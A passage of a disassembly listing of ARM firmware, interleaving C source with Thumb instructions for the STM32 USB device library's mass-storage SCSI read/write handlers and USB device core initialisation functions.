    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, ADDRESS_OUT_OF_RANGE);
 800ab28:	7af9      	ldrb	r1, [r7, #11]
 800ab2a:	2321      	movs	r3, #33	; 0x21
 800ab2c:	2205      	movs	r2, #5
 800ab2e:	68f8      	ldr	r0, [r7, #12]
 800ab30:	f7ff fb62 	bl	800a1f8 <SCSI_SenseCode>
    return -1;
 800ab34:	f04f 33ff 	mov.w	r3, #4294967295
 800ab38:	e000      	b.n	800ab3c <SCSI_CheckAddressRange+0x52>
  }

  return 0;
 800ab3a:	2300      	movs	r3, #0
}
 800ab3c:	4618      	mov	r0, r3
 800ab3e:	3718      	adds	r7, #24
 800ab40:	46bd      	mov	sp, r7
 800ab42:	bd80      	pop	{r7, pc}

0800ab44 <SCSI_ProcessRead>:
  *         Handle Read Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessRead(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800ab44:	b590      	push	{r4, r7, lr}
 800ab46:	b085      	sub	sp, #20
 800ab48:	af00      	add	r7, sp, #0
 800ab4a:	6078      	str	r0, [r7, #4]
 800ab4c:	460b      	mov	r3, r1
 800ab4e:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ab50:	687b      	ldr	r3, [r7, #4]
 800ab52:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab56:	687b      	ldr	r3, [r7, #4]
 800ab58:	32b0      	adds	r2, #176	; 0xb0
 800ab5a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab5e:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ab60:	68fb      	ldr	r3, [r7, #12]
 800ab62:	2b00      	cmp	r3, #0
 800ab64:	d102      	bne.n	800ab6c <SCSI_ProcessRead+0x28>
  {
    return -1;
 800ab66:	f04f 33ff 	mov.w	r3, #4294967295
 800ab6a:	e07b      	b.n	800ac64 <SCSI_ProcessRead+0x120>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ab6c:	68fb      	ldr	r3, [r7, #12]
 800ab6e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab72:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ab74:	68fa      	ldr	r2, [r7, #12]
 800ab76:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ab7a:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ab7e:	fb02 f303 	mul.w	r3, r2, r3
 800ab82:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800ab84:	68bb      	ldr	r3, [r7, #8]
 800ab86:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ab8a:	bf28      	it	cs
 800ab8c:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ab90:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ab92:	687b      	ldr	r3, [r7, #4]
 800ab94:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ab98:	687a      	ldr	r2, [r7, #4]
 800ab9a:	33b0      	adds	r3, #176	; 0xb0
 800ab9c:	009b      	lsls	r3, r3, #2
 800ab9e:	4413      	add	r3, r2
 800aba0:	685b      	ldr	r3, [r3, #4]
 800aba2:	691c      	ldr	r4, [r3, #16]
 800aba4:	68fb      	ldr	r3, [r7, #12]
 800aba6:	f103 0110 	add.w	r1, r3, #16
 800abaa:	68fb      	ldr	r3, [r7, #12]
 800abac:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abb0:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                    hmsc->scsi_blk_addr,
                                                                    (len / hmsc->scsi_blk_size)) < 0)
 800abb2:	68fb      	ldr	r3, [r7, #12]
 800abb4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abb8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800abbc:	4618      	mov	r0, r3
 800abbe:	68bb      	ldr	r3, [r7, #8]
 800abc0:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800abc4:	b29b      	uxth	r3, r3
 800abc6:	78f8      	ldrb	r0, [r7, #3]
 800abc8:	47a0      	blx	r4
 800abca:	4603      	mov	r3, r0
 800abcc:	2b00      	cmp	r3, #0
 800abce:	da08      	bge.n	800abe2 <SCSI_ProcessRead+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, UNRECOVERED_READ_ERROR);
 800abd0:	78f9      	ldrb	r1, [r7, #3]
 800abd2:	2311      	movs	r3, #17
 800abd4:	2204      	movs	r2, #4
 800abd6:	6878      	ldr	r0, [r7, #4]
 800abd8:	f7ff fb0e 	bl	800a1f8 <SCSI_SenseCode>
    return -1;
 800abdc:	f04f 33ff 	mov.w	r3, #4294967295
 800abe0:	e040      	b.n	800ac64 <SCSI_ProcessRead+0x120>
  }

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, hmsc->bot_data, len);
 800abe2:	4b22      	ldr	r3, [pc, #136]	; (800ac6c <SCSI_ProcessRead+0x128>)
 800abe4:	7819      	ldrb	r1, [r3, #0]
 800abe6:	68fb      	ldr	r3, [r7, #12]
 800abe8:	f103 0210 	add.w	r2, r3, #16
 800abec:	68bb      	ldr	r3, [r7, #8]
 800abee:	6878      	ldr	r0, [r7, #4]
 800abf0:	f002 f8f4 	bl	800cddc <USBD_LL_Transmit>

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800abf4:	68fb      	ldr	r3, [r7, #12]
 800abf6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abfa:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800abfc:	68fb      	ldr	r3, [r7, #12]
 800abfe:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac02:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac06:	4619      	mov	r1, r3
 800ac08:	68bb      	ldr	r3, [r7, #8]
 800ac0a:	fbb3 f3f1 	udiv	r3, r3, r1
 800ac0e:	4413      	add	r3, r2
 800ac10:	68fa      	ldr	r2, [r7, #12]
 800ac12:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac16:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800ac18:	68fb      	ldr	r3, [r7, #12]
 800ac1a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac1e:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800ac20:	68fb      	ldr	r3, [r7, #12]
 800ac22:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac26:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac2a:	4619      	mov	r1, r3
 800ac2c:	68bb      	ldr	r3, [r7, #8]
 800ac2e:	fbb3 f3f1 	udiv	r3, r3, r1
 800ac32:	1ad3      	subs	r3, r2, r3
 800ac34:	68fa      	ldr	r2, [r7, #12]
 800ac36:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac3a:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 6 : Hi = Di */
  hmsc->csw.dDataResidue -= len;
 800ac3c:	68fb      	ldr	r3, [r7, #12]
 800ac3e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac42:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800ac44:	68bb      	ldr	r3, [r7, #8]
 800ac46:	1ad3      	subs	r3, r2, r3
 800ac48:	68fa      	ldr	r2, [r7, #12]
 800ac4a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac4e:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800ac50:	68fb      	ldr	r3, [r7, #12]
 800ac52:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac56:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ac58:	2b00      	cmp	r3, #0
 800ac5a:	d102      	bne.n	800ac62 <SCSI_ProcessRead+0x11e>
  {
    hmsc->bot_state = USBD_BOT_LAST_DATA_IN;
 800ac5c:	68fb      	ldr	r3, [r7, #12]
 800ac5e:	2203      	movs	r2, #3
 800ac60:	721a      	strb	r2, [r3, #8]
  }

  return 0;
 800ac62:	2300      	movs	r3, #0
}
 800ac64:	4618      	mov	r0, r3
 800ac66:	3714      	adds	r7, #20
 800ac68:	46bd      	mov	sp, r7
 800ac6a:	bd90      	pop	{r4, r7, pc}
 800ac6c:	2000010a 	.word	0x2000010a

0800ac70 <SCSI_ProcessWrite>:
  *         Handle Write Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessWrite(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800ac70:	b590      	push	{r4, r7, lr}
 800ac72:	b085      	sub	sp, #20
 800ac74:	af00      	add	r7, sp, #0
 800ac76:	6078      	str	r0, [r7, #4]
 800ac78:	460b      	mov	r3, r1
 800ac7a:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ac7c:	687b      	ldr	r3, [r7, #4]
 800ac7e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ac82:	687b      	ldr	r3, [r7, #4]
 800ac84:	32b0      	adds	r2, #176	; 0xb0
 800ac86:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ac8a:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ac8c:	68fb      	ldr	r3, [r7, #12]
 800ac8e:	2b00      	cmp	r3, #0
 800ac90:	d102      	bne.n	800ac98 <SCSI_ProcessWrite+0x28>
  {
    return -1;
 800ac92:	f04f 33ff 	mov.w	r3, #4294967295
 800ac96:	e08e      	b.n	800adb6 <SCSI_ProcessWrite+0x146>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ac98:	68fb      	ldr	r3, [r7, #12]
 800ac9a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac9e:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aca0:	68fa      	ldr	r2, [r7, #12]
 800aca2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aca6:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800acaa:	fb02 f303 	mul.w	r3, r2, r3
 800acae:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800acb0:	68bb      	ldr	r3, [r7, #8]
 800acb2:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800acb6:	bf28      	it	cs
 800acb8:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800acbc:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800acbe:	687b      	ldr	r3, [r7, #4]
 800acc0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800acc4:	687a      	ldr	r2, [r7, #4]
 800acc6:	33b0      	adds	r3, #176	; 0xb0
 800acc8:	009b      	lsls	r3, r3, #2
 800acca:	4413      	add	r3, r2
 800accc:	685b      	ldr	r3, [r3, #4]
 800acce:	695c      	ldr	r4, [r3, #20]
 800acd0:	68fb      	ldr	r3, [r7, #12]
 800acd2:	f103 0110 	add.w	r1, r3, #16
 800acd6:	68fb      	ldr	r3, [r7, #12]
 800acd8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acdc:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                     hmsc->scsi_blk_addr,
                                                                     (len / hmsc->scsi_blk_size)) < 0)
 800acde:	68fb      	ldr	r3, [r7, #12]
 800ace0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ace4:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ace8:	4618      	mov	r0, r3
 800acea:	68bb      	ldr	r3, [r7, #8]
 800acec:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800acf0:	b29b      	uxth	r3, r3
 800acf2:	78f8      	ldrb	r0, [r7, #3]
 800acf4:	47a0      	blx	r4
 800acf6:	4603      	mov	r3, r0
 800acf8:	2b00      	cmp	r3, #0
 800acfa:	da08      	bge.n	800ad0e <SCSI_ProcessWrite+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, WRITE_FAULT);
 800acfc:	78f9      	ldrb	r1, [r7, #3]
 800acfe:	2303      	movs	r3, #3
 800ad00:	2204      	movs	r2, #4
 800ad02:	6878      	ldr	r0, [r7, #4]
 800ad04:	f7ff fa78 	bl	800a1f8 <SCSI_SenseCode>
    return -1;
 800ad08:	f04f 33ff 	mov.w	r3, #4294967295
 800ad0c:	e053      	b.n	800adb6 <SCSI_ProcessWrite+0x146>
  }

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ad0e:	68fb      	ldr	r3, [r7, #12]
 800ad10:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad14:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ad16:	68fb      	ldr	r3, [r7, #12]
 800ad18:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad1c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ad20:	4619      	mov	r1, r3
 800ad22:	68bb      	ldr	r3, [r7, #8]
 800ad24:	fbb3 f3f1 	udiv	r3, r3, r1
 800ad28:	4413      	add	r3, r2
 800ad2a:	68fa      	ldr	r2, [r7, #12]
 800ad2c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad30:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800ad32:	68fb      	ldr	r3, [r7, #12]
 800ad34:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad38:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800ad3a:	68fb      	ldr	r3, [r7, #12]
 800ad3c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad40:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ad44:	4619      	mov	r1, r3
 800ad46:	68bb      	ldr	r3, [r7, #8]
 800ad48:	fbb3 f3f1 	udiv	r3, r3, r1
 800ad4c:	1ad3      	subs	r3, r2, r3
 800ad4e:	68fa      	ldr	r2, [r7, #12]
 800ad50:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad54:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 12 : Ho = Do */
  hmsc->csw.dDataResidue -= len;
 800ad56:	68fb      	ldr	r3, [r7, #12]
 800ad58:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad5c:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800ad5e:	68bb      	ldr	r3, [r7, #8]
 800ad60:	1ad3      	subs	r3, r2, r3
 800ad62:	68fa      	ldr	r2, [r7, #12]
 800ad64:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad68:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800ad6a:	68fb      	ldr	r3, [r7, #12]
 800ad6c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad70:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ad72:	2b00      	cmp	r3, #0
 800ad74:	d104      	bne.n	800ad80 <SCSI_ProcessWrite+0x110>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800ad76:	2100      	movs	r1, #0
 800ad78:	6878      	ldr	r0, [r7, #4]
 800ad7a:	f7fe fc53 	bl	8009624 <MSC_BOT_SendCSW>
 800ad7e:	e019      	b.n	800adb4 <SCSI_ProcessWrite+0x144>
  }
  else
  {
    len = MIN((hmsc->scsi_blk_len * hmsc->scsi_blk_size), MSC_MEDIA_PACKET);
 800ad80:	68fb      	ldr	r3, [r7, #12]
 800ad82:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad86:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ad88:	68fa      	ldr	r2, [r7, #12]
 800ad8a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad8e:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ad92:	fb02 f303 	mul.w	r3, r2, r3
 800ad96:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ad9a:	bf28      	it	cs
 800ad9c:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ada0:	60bb      	str	r3, [r7, #8]

    /* Prepare EP to Receive next packet */
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800ada2:	4b07      	ldr	r3, [pc, #28]	; (800adc0 <SCSI_ProcessWrite+0x150>)
 800ada4:	7819      	ldrb	r1, [r3, #0]
 800ada6:	68fb      	ldr	r3, [r7, #12]
 800ada8:	f103 0210 	add.w	r2, r3, #16
 800adac:	68bb      	ldr	r3, [r7, #8]
 800adae:	6878      	ldr	r0, [r7, #4]
 800adb0:	f002 f84c 	bl	800ce4c <USBD_LL_PrepareReceive>
  }

  return 0;
 800adb4:	2300      	movs	r3, #0
}
 800adb6:	4618      	mov	r0, r3
 800adb8:	3714      	adds	r7, #20
 800adba:	46bd      	mov	sp, r7
 800adbc:	bd90      	pop	{r4, r7, pc}
 800adbe:	bf00      	nop
 800adc0:	2000010b 	.word	0x2000010b

0800adc4 <SCSI_UpdateBotData>:
  * @param  length: Data length
  * @retval status
  */
static int8_t SCSI_UpdateBotData(USBD_MSC_BOT_HandleTypeDef *hmsc,
                                 uint8_t *pBuff, uint16_t length)
{
 800adc4:	b480      	push	{r7}
 800adc6:	b087      	sub	sp, #28
 800adc8:	af00      	add	r7, sp, #0
 800adca:	60f8      	str	r0, [r7, #12]
 800adcc:	60b9      	str	r1, [r7, #8]
 800adce:	4613      	mov	r3, r2
 800add0:	80fb      	strh	r3, [r7, #6]
  uint16_t len = length;
 800add2:	88fb      	ldrh	r3, [r7, #6]
 800add4:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800add6:	68fb      	ldr	r3, [r7, #12]
 800add8:	2b00      	cmp	r3, #0
 800adda:	d102      	bne.n	800ade2 <SCSI_UpdateBotData+0x1e>
  {
    return -1;
 800addc:	f04f 33ff 	mov.w	r3, #4294967295
 800ade0:	e013      	b.n	800ae0a <SCSI_UpdateBotData+0x46>
  }

  hmsc->bot_data_length = len;
 800ade2:	8afa      	ldrh	r2, [r7, #22]
 800ade4:	68fb      	ldr	r3, [r7, #12]
 800ade6:	60da      	str	r2, [r3, #12]

  while (len != 0U)
 800ade8:	e00b      	b.n	800ae02 <SCSI_UpdateBotData+0x3e>
  {
    len--;
 800adea:	8afb      	ldrh	r3, [r7, #22]
 800adec:	3b01      	subs	r3, #1
 800adee:	82fb      	strh	r3, [r7, #22]
    hmsc->bot_data[len] = pBuff[len];
 800adf0:	8afb      	ldrh	r3, [r7, #22]
 800adf2:	68ba      	ldr	r2, [r7, #8]
 800adf4:	441a      	add	r2, r3
 800adf6:	8afb      	ldrh	r3, [r7, #22]
 800adf8:	7811      	ldrb	r1, [r2, #0]
 800adfa:	68fa      	ldr	r2, [r7, #12]
 800adfc:	4413      	add	r3, r2
 800adfe:	460a      	mov	r2, r1
 800ae00:	741a      	strb	r2, [r3, #16]
  while (len != 0U)
 800ae02:	8afb      	ldrh	r3, [r7, #22]
 800ae04:	2b00      	cmp	r3, #0
 800ae06:	d1f0      	bne.n	800adea <SCSI_UpdateBotData+0x26>
  }

  return 0;
 800ae08:	2300      	movs	r3, #0
}
 800ae0a:	4618      	mov	r0, r3
 800ae0c:	371c      	adds	r7, #28
 800ae0e:	46bd      	mov	sp, r7
 800ae10:	f85d 7b04 	ldr.w	r7, [sp], #4
 800ae14:	4770      	bx	lr

0800ae16 <USBD_Init>:
  * @param  id: Low level core index
  * @retval None
  */
USBD_StatusTypeDef USBD_Init(USBD_HandleTypeDef *pdev,
                             USBD_DescriptorsTypeDef *pdesc, uint8_t id)
{
 800ae16:	b580      	push	{r7, lr}
 800ae18:	b086      	sub	sp, #24
 800ae1a:	af00      	add	r7, sp, #0
 800ae1c:	60f8      	str	r0, [r7, #12]
 800ae1e:	60b9      	str	r1, [r7, #8]
 800ae20:	4613      	mov	r3, r2
 800ae22:	71fb      	strb	r3, [r7, #7]
  USBD_StatusTypeDef ret;

  /* Check whether the USB Host handle is valid */
  if (pdev == NULL)
 800ae24:	68fb      	ldr	r3, [r7, #12]
 800ae26:	2b00      	cmp	r3, #0
 800ae28:	d101      	bne.n	800ae2e <USBD_Init+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Device handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800ae2a:	2303      	movs	r3, #3
 800ae2c:	e01f      	b.n	800ae6e <USBD_Init+0x58>
    pdev->NumClasses = 0;
    pdev->classId = 0;
  }
#else
  /* Unlink previous class*/
  pdev->pClass[0] = NULL;
 800ae2e:	68fb      	ldr	r3, [r7, #12]
 800ae30:	2200      	movs	r2, #0
 800ae32:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  pdev->pUserData[0] = NULL;
 800ae36:	68fb      	ldr	r3, [r7, #12]
 800ae38:	2200      	movs	r2, #0
 800ae3a:	f8c3 22c4 	str.w	r2, [r3, #708]	; 0x2c4
#endif /* USE_USBD_COMPOSITE */

  pdev->pConfDesc = NULL;
 800ae3e:	68fb      	ldr	r3, [r7, #12]
 800ae40:	2200      	movs	r2, #0
 800ae42:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0

  /* Assign USBD Descriptors */
  if (pdesc != NULL)
 800ae46:	68bb      	ldr	r3, [r7, #8]
 800ae48:	2b00      	cmp	r3, #0
 800ae4a:	d003      	beq.n	800ae54 <USBD_Init+0x3e>
  {
    pdev->pDesc = pdesc;
 800ae4c:	68fb      	ldr	r3, [r7, #12]
 800ae4e:	68ba      	ldr	r2, [r7, #8]
 800ae50:	f8c3 22b4 	str.w	r2, [r3, #692]	; 0x2b4
  }

  /* Set Device initial State */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800ae54:	68fb      	ldr	r3, [r7, #12]
 800ae56:	2201      	movs	r2, #1
 800ae58:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->id = id;
 800ae5c:	68fb      	ldr	r3, [r7, #12]
 800ae5e:	79fa      	ldrb	r2, [r7, #7]
 800ae60:	701a      	strb	r2, [r3, #0]

  /* Initialize low level driver */
  ret = USBD_LL_Init(pdev);
 800ae62:	68f8      	ldr	r0, [r7, #12]
 800ae64:	f001 fdb6 	bl	800c9d4 <USBD_LL_Init>
 800ae68:	4603      	mov	r3, r0
 800ae6a:	75fb      	strb	r3, [r7, #23]

  return ret;
 800ae6c:	7dfb      	ldrb	r3, [r7, #23]
}
 800ae6e:	4618      	mov	r0, r3
 800ae70:	3718      	adds	r7, #24
 800ae72:	46bd      	mov	sp, r7
 800ae74:	bd80      	pop	{r7, pc}

0800ae76 <USBD_RegisterClass>:
  * @param  pDevice : Device Handle
  * @param  pclass: Class handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_RegisterClass(USBD_HandleTypeDef *pdev, USBD_ClassTypeDef *pclass)
{
 800ae76:	b580      	push	{r7, lr}
 800ae78:	b084      	sub	sp, #16
 800ae7a:	af00      	add	r7, sp, #0
 800ae7c:	6078      	str	r0, [r7, #4]
 800ae7e:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800ae80:	2300      	movs	r3, #0
 800ae82:	81fb      	strh	r3, [r7, #14]

  if (pclass == NULL)
 800ae84:	683b      	ldr	r3, [r7, #0]
 800ae86:	2b00      	cmp	r3, #0
 800ae88:	d101      	bne.n	800ae8e <USBD_RegisterClass+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Class handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800ae8a:	2303      	movs	r3, #3
 800ae8c:	e025      	b.n	800aeda <USBD_RegisterClass+0x64>
  }

  /* link the class to the USB Device handle */
  pdev->pClass[0] = pclass;
 800ae8e:	687b      	ldr	r3, [r7, #4]
 800ae90:	683a      	ldr	r2, [r7, #0]
 800ae92:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  if (pdev->pClass[pdev->classId]->GetHSConfigDescriptor != NULL)
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetHSConfigDescriptor(&len);
  }
#else /* Default USE_USB_FS */
  if (pdev->pClass[pdev->classId]->GetFSConfigDescriptor != NULL)
 800ae96:	687b      	ldr	r3, [r7, #4]
 800ae98:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ae9c:	687b      	ldr	r3, [r7, #4]
 800ae9e:	32ae      	adds	r2, #174	; 0xae
 800aea0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aea4:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800aea6:	2b00      	cmp	r3, #0
 800aea8:	d00f      	beq.n	800aeca <USBD_RegisterClass+0x54>
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetFSConfigDescriptor(&len);
 800aeaa:	687b      	ldr	r3, [r7, #4]
 800aeac:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aeb0:	687b      	ldr	r3, [r7, #4]
 800aeb2:	32ae      	adds	r2, #174	; 0xae
 800aeb4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aeb8:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800aeba:	f107 020e 	add.w	r2, r7, #14
 800aebe:	4610      	mov	r0, r2
 800aec0:	4798      	blx	r3
 800aec2:	4602      	mov	r2, r0
 800aec4:	687b      	ldr	r3, [r7, #4]
 800aec6:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0
  }
#endif /* USE_USB_FS */

  /* Increment the NumClasses */
  pdev->NumClasses ++;
 800aeca:	687b      	ldr	r3, [r7, #4]
 800aecc:	f8d3 32d8 	ldr.w	r3, [r3, #728]	; 0x2d8
 800aed0:	1c5a      	adds	r2, r3, #1
 800aed2:	687b      	ldr	r3, [r7, #4]
 800aed4:	f8c3 22d8 	str.w	r2, [r3, #728]	; 0x2d8

  return USBD_OK;
 800aed8:	2300      	movs	r3, #0
}
 800aeda:	4618      	mov	r0, r3
 800aedc:	3710      	adds	r7, #16
 800aede:	46bd      	mov	sp, r7
 800aee0:	bd80      	pop	{r7, pc}

0800aee2 <USBD_Start>:
  *         Start the USB Device Core.
  * @param  pdev: Device Handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_Start(USBD_HandleTypeDef *pdev)
{
 800aee2:	b580      	push	{r7, lr}
 800aee4:	b082      	sub	sp, #8
 800aee6:	af00      	add	r7, sp, #0
 800aee8:	6078      	str	r0, [r7, #4]
#ifdef USE_USBD_COMPOSITE
  pdev->classId = 0U;
#endif /* USE_USBD_COMPOSITE */

  /* Start the low level driver  */
  return USBD_LL_Start(pdev);
 800aeea:	6878      	ldr	r0, [r7, #4]
 800aeec:	f001 fdca 	bl	800ca84 <USBD_LL_Start>
 800aef0:	4603      	mov	r3, r0
}
 800aef2:	4618      	mov	r0, r3
 800aef4:	3708      	adds	r7, #8
 800aef6:	46bd      	mov	sp, r7
 800aef8:	bd80      	pop	{r7, pc}

0800aefa <USBD_RunTestMode>:
  *         Launch test mode process
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_RunTestMode(USBD_HandleTypeDef *pdev)
{
 800aefa:	b480      	push	{r7}
 800aefc:	b083      	sub	sp, #12
 800aefe:	af00      	add	r7, sp, #0
 800af00:	6078      	str	r0, [r7, #4]
  return ret;
#else
  /* Prevent unused argument compilation warning */
  UNUSED(pdev);

  return USBD_OK;
 800af02:	2300      	movs	r3, #0
#endif /* USBD_HS_TESTMODE_ENABLE */
}
 800af04:	4618      	mov	r0, r3
 800af06:	370c      	adds	r7, #12
 800af08:	46bd      	mov	sp, r7
 800af0a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800af0e:	4770      	bx	lr

0800af10 <USBD_SetClassConfig>:
  * @param  cfgidx: configuration index
  * @retval status
  */

USBD_StatusTypeDef USBD_SetClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800af10:	b580      	push	{r7, lr}
 800af12:	b084      	sub	sp, #16
 800af14:	af00      	add	r7, sp, #0
 800af16:	6078      	str	r0, [r7, #4]
